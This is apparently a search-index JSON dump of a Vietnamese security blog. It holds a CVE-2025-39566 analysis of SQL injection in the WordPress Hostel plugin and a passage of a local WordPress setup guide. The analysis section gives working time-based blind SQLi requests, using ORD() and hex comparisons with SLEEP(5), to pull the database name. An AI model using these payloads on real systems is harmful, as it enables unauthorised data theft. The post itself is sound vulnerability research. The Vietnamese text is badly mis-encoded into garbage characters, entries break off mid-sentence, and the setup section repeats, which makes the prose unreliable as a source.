tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Comparison\rS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'. Analysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi. ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#code-comparison"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch. To√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \"manage\" trong th∆∞ m·ª•c ch·ª©a plugin. Search Trong file models/hostel.php ta c√≥ h√†m: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', \"unavailable\")); add_submenu_page('wphostel_options', __(\"Email Log\", 'wphostel'), __(\"Email Log\", 'wphostel'), $wphostel_caps, 'wphostel_emaillog', array('WPHostelHelp', \"email_log\")); add_submenu_page('wphostel_options', __(\"Help\", 'wphostel'), __(\"Help\", 'wphostel'), $wphostel_caps, 'wphostel_help', array('WPHostelHelp', \"index\")); } // another logic } ·ªû ƒë√¢y: add_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•: // add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = '', $icon_url = '', $position = null); add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = ''); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); // array('WPHostelBookings', \"manage\")); =\u003e WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin. Menu UI Debugging Ch·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u003e cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√†","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:3","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Dump Data from Database\rBypass ' using ORD(): ƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name. Do sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u003e c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database. ORD bypass Bypass ' using Hex encoding (extend) Ngo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u003e c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database. Hex encoding bypass ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:4","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#dump-data-from-database"},{"categories":["CVE Analysis"],"collections":null,"content":"Remediation\rC·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#remediation"},{"categories":["CVE Analysis"],"collections":null,"content":"Takeaways\rsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet ‚Äì PortSwigger WordPress Hostel Plugin \u003c= 1.1.5.6 is vulnerable to SQL Injection - patchstack ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"collections":null,"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB. Ra ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress: WordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#"},{"categories":["Web"],"collections":null,"content":"Ecosystem\rCore: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:1:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#ecosystem"},{"categories":["Web"],"collections":null,"content":"Why WordPress Hacking?\rState of WordPress Security in 2024 ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:2:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#why-wordpress-hacking"},{"categories":["Web"],"collections":null,"content":"Most Popular\rHi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u003e c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:2:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#most-popular"},{"categories":["Web"],"collections":null,"content":"Plugin and Theme\rWordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:2:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#plugin-and-theme"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacking\rC√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04): Kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#setup-wordpress-for-hacking"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rC√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rT·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress\rT·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u003cVirtualHost *:80\u003e # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u003c/Directory\u003e # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u003cDirectory /srv/www/wordpress/wp-content\u003e Options FollowSymLinks Require all granted \u003c/Directory\u003e \u003c/VirtualHost\u003e K√≠ch ho·∫°t site WordPress: sudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite: sudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option): sudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã ‚ÄúIt works!‚Äù) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain. \u003cVirtualHost *:80\u003e ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u003c/VirtualHost\u003e Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database\rWordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u: B√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root: sudo mysql -u root C·∫•u h√¨nh MySQL: -- T·∫°o database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY '\u003cyour-password\u003e'; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u003e quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-and-configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rC√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rT·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress\rT·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. Options FollowSymLinks Require all granted K√≠ch ho·∫°t site WordPress: sudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite: sudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option): sudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã ‚ÄúIt works!‚Äù) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database\rWordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u: B√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root: sudo mysql -u root C·∫•u h√¨nh MySQL: -- T·∫°o database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u003e quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-dependencies"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rC√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rT·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user 